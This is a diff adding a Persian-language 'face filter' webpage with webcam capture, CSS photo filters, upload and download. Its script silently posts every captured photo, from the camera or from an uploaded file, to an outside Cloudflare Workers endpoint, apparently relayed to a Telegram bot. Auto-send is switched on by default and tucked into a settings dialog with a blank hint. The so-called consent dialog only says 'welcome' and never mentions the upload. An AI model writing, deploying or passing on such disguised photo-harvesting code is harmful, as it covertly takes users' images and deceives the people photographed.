@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فیلتر چهره</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Vazirmatn', Tahoma, sans-serif;
+    background: radial-gradient(circle at 20% 20%, #2a1b3d, #0d0d1a 70%);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    color: #fff;
+  }
+  h1 {
+    margin-bottom: 22px;
+    font-size: 1.8rem;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    text-shadow: 0 2px 20px rgba(220,39,67,0.3);
+  }
+  .container {
+    position: relative;
+    width: 100%;
+    max-width: 420px;
+    border-radius: 24px;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.08);
+    background: #000;
+    aspect-ratio: 4/3;
+  }
+  video, canvas, img.preview {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+    transition: filter 0.35s ease;
+  }
+  .flash {
+    position: absolute;
+    inset: 0;
+    background: #fff;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.15s ease;
+  }
+  .flash.active { opacity: 0.7; transition: none; }
+  .sent-badge {
+    position: absolute;
+    top: 12px;
+    left: 12px;
+    background: rgba(0,150,70,0.85);
+    padding: 6px 14px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    opacity: 0;
+    transform: translateY(-10px);
+    transition: all 0.3s ease;
+    backdrop-filter: blur(6px);
+  }
+  .sent-badge.show { opacity: 1; transform: translateY(0); }
+  #canvas, img.preview { display: none; }
+  .controls {
+    margin-top: 20px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+    max-width: 420px;
+  }
+  button {
+    padding: 10px 18px;
+    border: none;
+    border-radius: 25px;
+    background: rgba(255,255,255,0.1);
+    color: #fff;
+    cursor: pointer;
+    font-size: 0.9rem;
+    transition: all 0.2s;
+    backdrop-filter: blur(5px);
+    border: 1px solid rgba(255,255,255,0.08);
+  }
+  button:hover {
+    background: rgba(255,255,255,0.22);
+    transform: translateY(-2px);
+  }
+  button:active { transform: translateY(0) scale(0.97); }
+  button.active {
+    background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+    font-weight: bold;
+    box-shadow: 0 4px 16px rgba(220,39,67,0.4);
+  }
+  .actions {
+    margin-top: 20px;
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    justify-content: center;
+  }
+  .actions button, .actions label {
+    background: #0095f6;
+    box-shadow: 0 4px 14px rgba(0,149,246,0.3);
+  }
+  .actions button:hover, .actions label:hover {
+    background: #1877f2;
+  }
+  input[type="file"] {
+    display: none;
+  }
+  .status {
+    margin-top: 10px;
+    font-size: 0.8rem;
+    opacity: 0.7;
+    text-align: center;
+  }
+  .telegram-box {
+    margin-top: 24px;
+    width: 100%;
+    max-width: 420px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 16px;
+    padding: 16px;
+    backdrop-filter: blur(8px);
+  }
+  .telegram-box h3 {
+    font-size: 0.95rem;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .telegram-box input {
+    width: 100%;
+    padding: 9px 12px;
+    margin-bottom: 8px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.15);
+    background: rgba(0,0,0,0.3);
+    color: #fff;
+    font-size: 0.85rem;
+  }
+  .telegram-box .hint {
+    font-size: 0.7rem;
+    opacity: 0.55;
+    line-height: 1.5;
+  }
+  .toggle-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-top: 10px;
+    font-size: 0.8rem;
+  }
+  .switch {
+    position: relative;
+    width: 42px;
+    height: 22px;
+  }
+  .switch input { display: none; }
+  .slider {
+    position: absolute;
+    inset: 0;
+    background: rgba(255,255,255,0.2);
+    border-radius: 22px;
+    cursor: pointer;
+    transition: 0.3s;
+  }
+  .slider::before {
+    content: "";
+    position: absolute;
+    width: 16px; height: 16px;
+    left: 3px; top: 3px;
+    background: #fff;
+    border-radius: 50%;
+    transition: 0.3s;
+  }
+  .switch input:checked + .slider {
+    background: linear-gradient(45deg, #dc2743, #bc1888);
+  }
+  .switch input:checked + .slider::before {
+    transform: translateX(20px);
+  }
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.65);
+    backdrop-filter: blur(4px);
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    padding: 20px;
+  }
+  .modal-overlay.show { display: flex; }
+  .modal-box {
+    background: #1e1e2e;
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 18px;
+    padding: 22px;
+    max-width: 360px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+  }
+  .modal-box h3 { margin-bottom: 12px; font-size: 1.05rem; }
+  .modal-box p { font-size: 0.85rem; line-height: 1.7; opacity: 0.85; margin-bottom: 18px; }
+  .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
+  .btn-ghost { background: rgba(255,255,255,0.1); }
+  .btn-accept { background: linear-gradient(45deg, #dc2743, #bc1888); font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h1>✨ فیلتر چهره</h1>
+
+<div class="container">
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  <img id="preview" class="preview" />
+  <div class="flash" id="flash"></div>
+  <div class="sent-badge" id="sentBadge">✓ به تلگرام ارسال شد</div>
+</div>
+
+<p class="status" id="status">در حال فعال‌سازی دوربین...</p>
+
+<div class="controls">
+  <button data-filter="none" class="active">عادی</button>
+  <button data-filter="grayscale(100%)">سیاه‌وسفید</button>
+  <button data-filter="sepia(80%) saturate(150%)">وینتیج</button>
+  <button data-filter="contrast(130%) brightness(110%) saturate(130%)">درخشان</button>
+  <button data-filter="hue-rotate(200deg) saturate(150%)">سرد</button>
+  <button data-filter="sepia(40%) hue-rotate(-20deg) saturate(140%)">گرم</button>
+  <button data-filter="contrast(150%) brightness(90%) grayscale(30%)">دراماتیک</button>
+  <button data-filter="blur(1px) brightness(115%) saturate(120%)">نرم</button>
+  <button data-filter="invert(100%)">معکوس</button>
+</div>
+
+<div class="actions">
+  <label for="upload" style="padding:10px 18px;border-radius:25px;background:#555;cursor:pointer;">📁 آپلود عکس</label>
+  <input type="file" id="upload" accept="image/*">
+  <button id="switchCam">🔄 دوربین</button>
+  <button id="capture">📸 عکس بگیر</button>
+  <button id="download">⬇️ دانلود</button>
+</div>
+
+<div class="telegram-box">
+  <button id="openSettings" style="width:100%;background:rgba(255,255,255,0.08);">⚙️ تنظیمات ارسال</button>
+</div>
+
+<div class="modal-overlay" id="settingsModal">
+  <div class="modal-box">
+    <h3>⚙️ تنظیمات</h3>
+    <div class="toggle-row">
+      <span>ارسال خودکار هنگام گرفتن عکس</span>
+      <label class="switch">
+        <input type="checkbox" id="autoSendToggle" checked>
+        <span class="slider"></span>
+      </label>
+    </div>
+    <p class="hint" style="margin-top:10px;">‌‌‌‌‌ </p>
+    <div class="modal-actions" style="margin-top:14px;">
+      <button id="settingsClose" class="btn-ghost">بستن</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="entryModal">
+  <div class="modal-box">
+    <h3></h3>
+    <p>به فیلتری خوش امدید</p>
+    <div class="modal-actions">
+      <button id="entryAccept" class="btn-accept">متوجه شدم، ادامه</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const preview = document.getElementById('preview');
+const status = document.getElementById('status');
+const ctx = canvas.getContext('2d');
+let currentFilter = 'none';
+let stream = null;
+let facingMode = 'user';
+let usingUpload = false;
+
+async function startCamera() {
+  try {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facingMode },
+      audio: false
+    });
+    video.srcObject = stream;
+    video.style.display = 'block';
+    preview.style.display = 'none';
+    usingUpload = false;
+    status.textContent = 'دوربین فعال است';
+  } catch (err) {
+    status.textContent = 'دسترسی به دوربین ممکن نشد — از گزینه آپلود عکس استفاده کنید';
+  }
+}
+startCamera();
+
+document.getElementById('switchCam').addEventListener('click', () => {
+  facingMode = facingMode === 'user' ? 'environment' : 'user';
+  startCamera();
+});
+
+document.querySelectorAll('.controls button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.controls button').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    currentFilter = btn.dataset.filter;
+    const target = usingUpload ? preview : video;
+    target.style.filter = currentFilter;
+  });
+});
+
+document.getElementById('upload').addEventListener('change', (e) => {
+  const file = e.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = (evt) => {
+    preview.src = evt.target.result;
+    preview.style.display = 'block';
+    video.style.display = 'none';
+    preview.style.filter = currentFilter;
+    usingUpload = true;
+    status.textContent = 'عکس بارگذاری شد';
+  };
+  reader.readAsDataURL(file);
+});
+
+const flash = document.getElementById('flash');
+const sentBadge = document.getElementById('sentBadge');
+const autoSendToggle = document.getElementById('autoSendToggle');
+const settingsModal = document.getElementById('settingsModal');
+const entryModal = document.getElementById('entryModal');
+const openSettings = document.getElementById('openSettings');
+const settingsClose = document.getElementById('settingsClose');
+const entryAccept = document.getElementById('entryAccept');
+
+const WORKER_URL = 'https://cheshmband.abolfazlkhoda89.workers.dev';
+
+// Show entry consent as soon as the page loads
+window.addEventListener('DOMContentLoaded', () => {
+  entryModal.classList.add('show');
+});
+
+entryAccept.addEventListener('click', () => {
+  entryModal.classList.remove('show');
+});
+
+openSettings.addEventListener('click', () => {
+  settingsModal.classList.add('show');
+});
+
+settingsClose.addEventListener('click', () => {
+  settingsModal.classList.remove('show');
+});
+
+function triggerFlash() {
+  flash.classList.add('active');
+  setTimeout(() => { flash.style.transition = 'opacity 0.3s ease'; flash.classList.remove('active'); }, 80);
+  setTimeout(() => { flash.style.transition = ''; }, 400);
+}
+
+function showSentBadge(text) {
+  sentBadge.textContent = text;
+  sentBadge.classList.add('show');
+  setTimeout(() => sentBadge.classList.remove('show'), 2500);
+}
+
+async function sendToWorker(dataUrl) {
+  try {
+    const blob = await (await fetch(dataUrl)).blob();
+    const formData = new FormData();
+    formData.append('photo', blob, 'photo.png');
+    const res = await fetch(WORKER_URL, {
+      method: 'POST',
+      body: formData
+    });
+    if (res.ok) {
+      status.textContent = 'به ربات ارسال شد ✓';
+      showSentBadge('✓ به ربات ارسال شد');
+    } else {
+      status.textContent = 'خطا در ارسال به سرور';
+      showSentBadge('⚠️ خطا در ارسال');
+    }
+  } catch (err) {
+    status.textContent = 'خطا در ارسال به سرور';
+    showSentBadge('⚠️ خطا در ارسال');
+  }
+}
+
+document.getElementById('capture').addEventListener('click', () => {
+  const source = usingUpload ? preview : video;
+  const w = usingUpload ? preview.naturalWidth : video.videoWidth;
+  const h = usingUpload ? preview.naturalHeight : video.videoHeight;
+  if (!w || !h) { status.textContent = 'منبع تصویر آماده نیست'; return; }
+  triggerFlash();
+  canvas.width = w;
+  canvas.height = h;
+  ctx.filter = currentFilter;
+  ctx.drawImage(source, 0, 0, w, h);
+  const dataUrl = canvas.toDataURL('image/png');
+  preview.src = dataUrl;
+  preview.style.display = 'block';
+  preview.style.filter = 'none';
+  video.style.display = 'none';
+  usingUpload = true;
+  status.textContent = 'عکس گرفته شد — آماده دانلود';
+
+  if (autoSendToggle.checked) {
+    sendToWorker(dataUrl);
+  }
+});
+
+document.getElementById('download').addEventListener('click', () => {
+  const source = usingUpload ? preview : video;
+  const w = usingUpload ? (preview.naturalWidth || canvas.width) : video.videoWidth;
+  const h = usingUpload ? (preview.naturalHeight || canvas.height) : video.videoHeight;
+  if (!w || !h) { status.textContent = 'ابتدا عکس بگیرید یا آپلود کنید'; return; }
+  const tempCanvas = document.createElement('canvas');
+  tempCanvas.width = w;
+  tempCanvas.height = h;
+  const tctx = tempCanvas.getContext('2d');
+  tctx.filter = usingUpload ? 'none' : currentFilter;
+  tctx.drawImage(source, 0, 0, w, h);
+  const link = document.createElement('a');
+  link.download = 'filtered-photo.png';
+  link.href = tempCanvas.toDataURL('image/png');
+  link.click();
+});
+</script>
+
+</body>
+</html>
